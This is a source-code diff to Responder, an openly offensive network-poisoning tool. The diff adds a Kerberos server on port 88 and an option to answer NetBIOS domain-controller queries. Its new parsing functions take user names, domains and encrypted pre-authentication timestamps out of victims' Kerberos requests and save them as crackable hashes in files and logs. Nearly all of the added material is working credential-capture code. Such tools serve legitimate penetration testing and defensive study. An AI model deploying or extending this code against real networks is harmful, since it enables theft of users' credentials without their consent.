@@ -36,6 +36,8 @@ parser.add_option('-b', '--basic',action="store", help="Set this to On if you wa
 
 parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off", metavar="Off",dest="Wredirect", choices=['On','on','off','Off'], default="Off")
 
+parser.add_option('-d', '--NBTNSdomain',action="store", help="Set this to enable answers for netbios domain suffix queries. Answering to domain will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off", metavar="Off",dest="NBTNSDomain", choices=['On','on','off','Off'], default="Off")
+
 parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','on','off','Off'], default="Off")
 
 parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is Off", metavar="On", choices=['On','on','off','Off'], default="Off")
@@ -70,6 +72,7 @@ IMAP_On_Off = config.get('Responder Core', 'IMAP').upper()
 SMTP_On_Off = config.get('Responder Core', 'SMTP').upper()
 LDAP_On_Off = config.get('Responder Core', 'LDAP').upper()
 DNS_On_Off = config.get('Responder Core', 'DNS').upper()
+Krb_On_Off = config.get('Responder Core', 'Kerberos').upper()
 NumChal = config.get('Responder Core', 'Challenge')
 SessionLog = config.get('Responder Core', 'SessionLog')
 Exe_On_Off = config.get('HTTP Server', 'Serve-Exe').upper()
@@ -83,6 +86,7 @@ OURIP = options.OURIP
 LM_On_Off = options.LM_On_Off.upper()
 WPAD_On_Off = options.WPAD_On_Off.upper()
 Wredirect = options.Wredirect.upper()
+NBTNSDomain = options.NBTNSDomain.upper()
 Basic = options.Basic.upper()
 Finger_On_Off = options.Finger.upper()
 INTERFACE = options.INTERFACE
@@ -197,7 +201,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nIMAP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
+Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is:%s\nKerberos Server is:%s\nSQL Server is:%s\nFTP Server is:%s\nIMAP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,Krb_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 if AnalyzeMode:
    print '[+]Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n'
@@ -283,11 +287,18 @@ def NBT_NS_Role(data):
 def Validate_NBT_NS(data,Wredirect):
     if Analyze(AnalyzeMode):
        return False
+
     if NBT_NS_Role(data[43:46]) == "File Server Service.":
        return True
+
+    if NBTNSDomain == "ON":
+       if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
+          return True
+
     if Wredirect == "ON":
        if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
           return True
+
     else:
        return False
 
@@ -308,8 +319,7 @@ def Decode_Name(nbname):
 class NB(BaseRequestHandler):
 
     def handle(self):
-        request, socket = self.request
-        data = request
+        data, socket = self.request
         Name = Decode_Name(data[13:45])
 
         if Analyze(AnalyzeMode):
@@ -738,9 +748,9 @@ class SMB1(BaseRequestHandler):
                 data = self.request.recv(1024)
              ##Negotiate proto answer.
               if data[8:10] == "\x72\x00":
-                # Customize SMB answer.
+                #Customize SMB answer.
                 head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
-                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data))
+                t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
                 t.calculate()
                 final = t 
                 packet0 = str(head)+str(final)
@@ -859,7 +869,132 @@ class SMB1LM(BaseRequestHandler):
 
         except Exception:
            self.request.close()
-           pass #no need to print errors..
+           pass
+
+
+##################################################################################
+#Kerberos Server
+##################################################################################
+def ParseMSKerbv5TCP(Data):
+   MsgType = Data[21:22]
+   EncType = Data[43:44]
+   MessageType = Data[32:33]
+   if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
+      if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
+         HashLen = struct.unpack('<b',Data[50:51])[0]
+         if HashLen == 54:
+            Hash = Data[53:105]
+            SwitchHash = Hash[16:]+Hash[0:16]
+            NameLen = struct.unpack('<b',Data[153:154])[0]
+            Name = Data[154:154+NameLen]
+            DomainLen = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
+            Domain = Data[154+NameLen+4:154+NameLen+4+DomainLen]
+            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+            return BuildHash
+      if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
+         HashLen = struct.unpack('<b',Data[45:46])[0]
+         if HashLen == 53:
+            Hash = Data[48:99]
+            SwitchHash = Hash[16:]+Hash[0:16]
+            NameLen = struct.unpack('<b',Data[147:148])[0]
+            Name = Data[148:148+NameLen]
+            DomainLen = struct.unpack('<b',Data[148+NameLen+3:148+NameLen+4])[0]
+            Domain = Data[148+NameLen+4:148+NameLen+4+DomainLen]
+            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+            return BuildHash
+         if HashLen == 54:
+            Hash = Data[53:105]
+            SwitchHash = Hash[16:]+Hash[0:16]
+            NameLen = struct.unpack('<b',Data[148:149])[0]
+            Name = Data[149:149+NameLen]
+            DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
+            Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
+            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+            return BuildHash
+
+      else:
+         Hash = Data[48:100]
+         SwitchHash = Hash[16:]+Hash[0:16]
+         NameLen = struct.unpack('<b',Data[148:149])[0]
+         Name = Data[149:149+NameLen]
+         DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
+         Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
+         BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+         return BuildHash
+   else:
+      return False
+
+def ParseMSKerbv5UDP(Data):
+   MsgType = Data[17:18]
+   EncType = Data[39:40]
+   if MsgType == "\x0a" and EncType == "\x17":
+      if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
+         HashLen = struct.unpack('<b',Data[41:42])[0]
+         if HashLen == 54:
+            Hash = Data[44:96]
+            SwitchHash = Hash[16:]+Hash[0:16]
+            NameLen = struct.unpack('<b',Data[144:145])[0]
+            Name = Data[145:145+NameLen]
+            DomainLen = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
+            Domain = Data[145+NameLen+4:145+NameLen+4+DomainLen]
+            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+            return BuildHash
+         if HashLen == 53:
+            Hash = Data[44:95]
+            SwitchHash = Hash[16:]+Hash[0:16]
+            NameLen = struct.unpack('<b',Data[143:144])[0]
+            Name = Data[144:144+NameLen]
+            DomainLen = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
+            Domain = Data[144+NameLen+4:144+NameLen+4+DomainLen]
+            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+            return BuildHash
+
+
+      else:
+         Hash = Data[49:101]
+         SwitchHash = Hash[16:]+Hash[0:16]
+         NameLen = struct.unpack('<b',Data[149:150])[0]
+         Name = Data[150:150+NameLen]
+         DomainLen = struct.unpack('<b',Data[150+NameLen+3:150+NameLen+4])[0]
+         Domain = Data[150+NameLen+4:150+NameLen+4+DomainLen]
+         BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
+         return BuildHash
+   else:
+      return False
+
+class KerbTCP(BaseRequestHandler):
+
+    def handle(self):
+        try:
+           data = self.request.recv(1024)
+           KerbHash = ParseMSKerbv5TCP(data)
+           if KerbHash:
+              Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+              if PrintData(Outfile,KerbHash):
+                 print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
+                 print "[+]MSKerbv5 complete hash is :", KerbHash
+                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+                 WriteData(Outfile,KerbHash, KerbHash)
+                 logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash)) 
+        except Exception:
+           raise
+
+class KerbUDP(BaseRequestHandler):
+
+    def handle(self):
+        try:
+           data, soc = self.request
+           KerbHash = ParseMSKerbv5UDP(data)
+           if KerbHash:
+              Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+              if PrintData(Outfile,KerbHash):
+                 print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
+                 print "[+]MSKerbv5 complete hash is :", KerbHash
+                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
+                 WriteData(Outfile,KerbHash, KerbHash)
+                 logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash)) 
+        except Exception:
+           raise
 
 ##################################################################################
 #SQL Stuff
@@ -2087,6 +2222,13 @@ def Is_SMB_On(SMB_On_Off):
        return False
 
 #Function name self-explanatory
+def Is_Kerberos_On(Krb_On_Off):
+    if Krb_On_Off == "ON":
+       return thread.start_new(serve_thread_udp,('', 88,KerbUDP)),thread.start_new(serve_thread_tcp,('', 88, KerbTCP))
+    if Krb_On_Off == "OFF":
+       return False
+
+#Function name self-explanatory
 def Is_SQL_On(SQL_On_Off):
     if SQL_On_Off == "ON":
        return thread.start_new(serve_thread_tcp,('', 1433,MSSQL))
@@ -2246,6 +2388,7 @@ def main():
       Is_HTTP_On(On_Off)
       Is_HTTPS_On(SSL_On_Off)
       Is_WPAD_On(WPAD_On_Off)
+      Is_Kerberos_On(Krb_On_Off)
       Is_SMB_On(SMB_On_Off)
       Is_SQL_On(SQL_On_Off)
       Is_LDAP_On(LDAP_On_Off)
@@ -2257,6 +2400,7 @@ def main():
       thread.start_new(serve_thread_udp,('', 138,Browser))
       ## Poisoner loaded by default, it's the purpose of this tool...
       thread.start_new(serve_thread_udp_MDNS,('', 5353,MDNS))   #MDNS
+      thread.start_new(serve_thread_udp,('', 88, KerbUDP))
       thread.start_new(serve_thread_udp,('', 137,NB))           #NBNS
       thread.start_new(serve_thread_udp_LLMNR,('', 5355, LLMNR)) #LLMNR
       while num_thrd > 0:
@@ -2269,7 +2413,3 @@ if __name__ == '__main__':
         main()
     except:
         raise
-
-
-
-
